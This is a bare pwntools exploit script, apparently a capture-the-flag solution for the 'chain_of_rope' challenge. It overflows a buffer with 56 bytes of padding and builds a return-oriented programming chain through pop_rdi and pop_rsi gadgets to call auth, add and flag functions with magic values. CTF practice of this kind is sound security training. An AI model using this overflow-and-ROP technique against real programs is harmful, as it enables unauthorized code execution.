from pwn import *

ip = "shell.actf.co"
port = 19400

r = process("./chain_of_rope")
r = remote(ip, port)

context.arch = 'amd64'

auth = 0x000000000401196
add = 0x0000000004011ab
flag = 0x401231
pop_rdi = 0x0000000000401403
pop_rsi = 0x0000000000401401

r.sendlineafter('access', '1')
r.sendline('a' * 56 + flat(auth, pop_rdi, 0xdeadbeef, add, pop_rdi, 0xba5eba11, pop_rsi, 0xbedabb1e, 0, flag))

r.interactive()
